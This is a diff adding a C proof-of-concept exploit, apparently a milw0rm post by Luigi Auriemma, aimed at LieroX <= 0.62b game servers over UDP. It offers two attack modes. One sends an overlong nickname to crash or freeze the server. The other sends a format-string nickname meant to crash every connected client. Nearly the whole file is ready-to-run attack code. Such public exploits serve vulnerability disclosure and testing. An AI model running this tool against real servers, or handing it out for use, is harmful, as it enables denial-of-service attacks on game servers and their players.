@@ -1,0 +1,459 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdarg.h>
+#include <time.h>
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+    #define close   closesocket
+    #define ONESEC  1000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define stricmp strcasecmp
+    #define stristr strcasestr
+    #define ONESEC  1
+#endif
+
+
+
+#define VER         "0.1"
+#define BUFFSZ      4096
+#define PORT        23400
+#define TIMEOUT     1
+#define TWAIT       5
+#define CRASHSZ     200     // 128 or more
+#define FSTRING     "%02000x"
+
+
+
+void delimit(u_char *data);
+void show_info(u_char *data);
+int lierox_build_pck(u_char *buff, u_char *cmd, u_char *id, ...);
+int mycpy(u_char *dst, u_char *src);
+int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
+int create_rand_string(u_char *data, int len, u_int rnd);
+int timeout(int sock);
+u_int resolv(char *host);
+void std_err(void);
+
+
+
+struct  sockaddr_in peer;
+
+
+
+int main(int argc, char *argv[]) {
+    struct  sockaddr_in peerl;
+    u_int   seed;
+    int     sd,
+            len,
+            attack;
+    u_short port = PORT;
+    u_char  password[33],
+            nick[CRASHSZ + 1],
+            buff[BUFFSZ],
+            id[4],          // I use char for endian compatibility
+            *cmd,
+            *details;
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "LieroX <= 0.62b multiple vulnerabilities " VER "\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <host> [port(%hu)]\n"
+            "\n"
+            "Attack:\n"
+            "1 = server crash/freeze\n"
+            "2 = in-game nickname format string versus all the clients in the server\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+    attack = atoi(argv[1]);
+    if(argc > 3) port = atoi(argv[3]);
+
+    peer.sin_addr.s_addr  = resolv(argv[2]);
+    peer.sin_port         = htons(port);
+    peer.sin_family       = AF_INET;
+
+    peerl.sin_addr.s_addr = INADDR_ANY;
+    peerl.sin_port        = htons(time(NULL));
+    peerl.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    seed = time(NULL);
+    cmd  = buff + 8;
+    *password = 0;
+
+    fputs("- request informations\n", stdout);
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    len = lierox_build_pck(buff, "query", NULL);
+    *(u_short *)(buff + len) = ~seed;
+    len += 2;
+
+    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
+    show_info(buff);
+    close(sd);
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+redo:
+    len = lierox_build_pck(buff, "getchallenge", NULL);
+    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
+
+    if(stricmp(cmd, "challenge")) {
+        printf("\n"
+            "Error: wrong challenge reply received:\n"
+            "       %s\n"
+            "\n", cmd);
+        exit(1);
+    }
+    memcpy(id, cmd + 10, 4);
+
+    seed = create_rand_string(nick, sizeof(nick), seed);
+
+    if(attack == 1) {
+        // the bug is NOT in the nickname, we must
+        // simply send a big parameter or value!
+        printf("- server crash/freeze attack (%d bytes)\n", sizeof(nick) - 1);
+        memset(nick, 'a', sizeof(nick) - 1);
+        nick[sizeof(nick) - 1] = 0;
+
+    } else if(attack == 2) {
+        printf("- client format string attack\n");
+        strcpy(nick, FSTRING);
+
+    } else {
+        printf("\nError: wrong attack number selected\n\n");
+        exit(1);
+    }
+
+    len = lierox_build_pck(buff, "connect", id,
+        "name",         nick,
+        "skin",         "default.png",  // directory traversal but not exploitable
+        "col_r",        "128",
+        "col_g",        "200",
+        "col_b",        "255",
+        "packet_size",  "400",
+        "update_rate",  "8",
+        "spectator",    "0",
+        "pass",         password,
+        NULL,           NULL);
+
+    len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
+    if(len < 0) {
+        if(attack == 1) {
+            printf("\n- server seems crashed, I check it:\n");
+            len = lierox_build_pck(buff, "ping", NULL);
+            *(u_short *)(buff + len) = ~seed;
+            len += 2;
+            len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
+            if(len < 0) {
+                printf("\n  Server IS vulnerable!!!\n\n");
+            } else {
+                printf("\n  Server doesn't seem vulnerable\n\n");
+            }
+        }
+
+    } else {
+        details = cmd + strlen(cmd) + 1;
+        if(details >= (buff + len)) details = "";
+
+        if(!stricmp(cmd, "goodconnection")) {
+            printf("\n"
+                "- the player is now in the server\n"
+                "  any client inside it should have been crashed\n\n");
+
+            /* // if you need to send commands:
+            *(u_int *)buff       = 0 | 0x80000000;
+            *(u_int *)(buff + 4) = 1;
+            buff[8] = 1;
+            len = 9 + mycpy(buff + 9, "command if needed");
+            len = send_recv(sd, buff, len, buff, sizeof(buff), 0);
+            */
+
+        } else if(!stricmp(cmd, "badpassword")) {
+            printf("\n- server is protected. Insert the password required:\n  ");
+            fflush(stdin);
+            fgets(password, sizeof(password), stdin);
+            delimit(password);
+            goto redo;
+
+        } else {
+            printf("\n- player not accepted (%s)\n\n", details);
+        }
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+void delimit(u_char *data) {
+    while(*data && (*data != '\n') && (*data != '\r')) data++;
+    *data = 0;
+}
+
+
+
+void show_info(u_char *data) {
+    data += 8;
+    data += strlen(data) + 1 + 2 + 2;
+
+    printf("\n  Name:      %s\n", data);
+    data += strlen(data) + 1;
+
+    printf("  Players:   %hhu/%hhu\n", data[0], data[1]);
+    data += 3;
+
+    printf("  Mod:       %s\n", data);
+    data += strlen(data) + 1;
+
+    printf("  Game:      %s\n", data);
+    data += strlen(data) + 1;
+}
+
+
+
+int lierox_build_pck(u_char *buff, u_char *cmd, u_char *id, ...) {
+    va_list ap;
+    u_char  *par,
+            *val,
+            *p;
+
+    p = buff;
+
+    memcpy(p, "\xff\xff\xff\xff", 4);
+    p += 4;
+
+    memcpy(p, "lx::", 4);
+    p += 4;
+
+    p += mycpy(p, cmd);
+
+    if(id) {
+        *p++ = 13;
+        memcpy(p, id, 4);
+        p += 4;
+
+        va_start(ap, id);
+        while((par = va_arg(ap, u_char *)) && (val = va_arg(ap, u_char *))) {
+            p += mycpy(p, par);
+            *(p - 1) = ';';
+            p += mycpy(p, val);
+            *(p - 1) = '/';
+        }
+        va_end(ap);
+
+        *p++ = 0;
+    }
+
+    return(p - buff);
+}
+
+
+
+int mycpy(u_char *dst, u_char *src) {
+    u_char  *p;
+
+    for(p = dst; *src; src++, p++) {
+        *p = *src;
+    }
+    *p++ = 0;
+    return(p - dst);
+}
+
+
+
+int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
+    int     retry,
+            len;
+
+    for(retry = 3; retry; retry--) {
+        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
+          < 0) std_err();
+        fputc('.', stdout);
+        if(!timeout(sd)) break;
+    }
+
+    if(!retry) {
+        if(!err) return(-1);
+        fputs("\nError: socket timeout, no reply received\n\n", stdout);
+        exit(1);
+    }
+
+    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
+    if(len < 0) std_err();
+    fputc('.', stdout);
+
+    return(len);
+}
+
+
+
+int create_rand_string(u_char *data, int len, u_int rnd) {
+    const static u_char table[] =
+                "0123456789"
+                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                "abcdefghijklmnopqrstuvwxyz";
+
+    len = rnd % len;
+    if(len < 3) len = 3;
+
+    while(--len) {
+        rnd = (rnd * 0x343FD) + 0x269EC3;
+        rnd >>= 3;
+        *data++ = table[rnd % (sizeof(table) - 1)];
+    }
+    *data = 0;
+
+    return(rnd);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec  = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_int resolv(char *host) {
+    struct  hostent *hp;
+    u_int   host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_int *)(hp->h_addr);
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2006-03-06]
